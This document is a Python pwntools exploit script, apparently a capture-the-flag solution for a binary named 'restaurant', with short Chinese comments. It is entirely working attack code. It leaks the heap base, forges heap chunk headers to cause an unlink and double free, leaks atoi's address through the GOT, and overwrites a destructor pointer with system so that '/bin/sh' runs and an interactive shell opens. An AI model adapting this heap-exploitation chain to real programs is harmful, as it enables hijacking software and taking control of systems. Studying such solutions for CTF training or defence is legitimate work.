#-* coding=utf-8 -*#
from pwn import *

p = process( './restaurant' )

atoi_got = 0x6060a0

system_libc = 0x41490

atoi_libc = 0x362c0

def pwn () :
    p.sendlineafter ( 'Please enter your name: ' , '/bin/sh' )
    p.recvuntil ( 'you are the luckey ')
    heap_base = int ( p.recvuntil ( 'th' )[:-2] )#leak heap base
    p.sendlineafter ( 'Are you from China? (y/n) ' , 'n')
    country = 'purean\x00' + 'a' * 9 + p64( 0x40471c )#覆盖money的值，使它在购买两个类型２后的值刚好为虚函数表
    p.recvuntil ( 'Dear foreigner, please enter your country: '  )
    p.send ( country )
    p.sendlineafter ( 'How old are you: ' , '20' )
    p.sendlineafter ( '8. Finish your order.\n' , '1' )
    p.sendlineafter ( '8. Finish your order.\n' , '2' )
    p.sendlineafter ( '8. Finish your order.\n' , '7' )
    p.sendlineafter ( '(1,2 or 3 depend on menu): ' , '1' )
    p.sendlineafter ( 'How does this dish look: \n' , 'a'*10 )
    p.sendlineafter ( 'How does this dish taste: \n' , 'aaa' )
    p.sendlineafter ( '8. Finish your order.\n' , '7' )
    fakebk = heap_base + 0x28
    fakefd = heap_base + 0x20
    appcom = 'a'*40 + p64(0x80) + p64(0x90)#溢出下一个chunk头
    tastecom = p64(0x81) + p64(fakefd) + p64(fakebk)#伪造chunk头
    p.sendlineafter ( '(1,2 or 3 depend on menu): ' , '1' )
    p.sendlineafter ( 'How does this dish look: \n' ,appcom)
    p.sendlineafter ( 'How does this dish taste: \n' , tastecom )
    p.sendlineafter ( '8. Finish your order.\n' , '5' )
    p.sendlineafter ( 'want to cancel(1,2 or 3 depend on menu): ' , '2' )#double free，改写第一个菜的指针指向自己前１８个字节的位置，即money处，刚好money值为虚函数表
    p.sendlineafter ( '8. Finish your order.\n' , '7' )
    p.sendlineafter ( '(1,2 or 3 depend on menu): ' , '1' )
    p.sendlineafter ( 'How does this dish look: \n' , p64( atoi_got ) )#改写age值，因为age是个指针
    p.sendlineafter ( 'How does this dish taste: \n' , p64( atoi_got ) )
    p.sendlineafter ( '8. Finish your order.\n' , '6' )
    p.recvuntil ( 'Your age: ' )
    atoi_add = int ( p.recv( 15 ) )#leak　atoi函数地址
    system_add = atoi_add - atoi_libc + system_libc
    p.sendlineafter ( '8. Finish your order.\n' , '7' )
    p.sendlineafter ( '(1,2 or 3 depend on menu): ' , '1' )
    p.sendlineafter ( 'How does this dish look: \n' , p64( 0x404710 ) + p64( system_add )  )#改写最后的析构函数指针为system函数，因为第一个是name，刚好时/bin.sh，触发拿shell
    p.sendlineafter ( 'How does this dish taste: \n' , p64( 0x404710 ) + p64( system_add ) )
    p.sendlineafter ( '8. Finish your order.\n' , '8' )
    p.sendlineafter ( '3.Just so so!\n' , '3')
    p.interactive()

if __name__ == '__main__' :
    pwn()
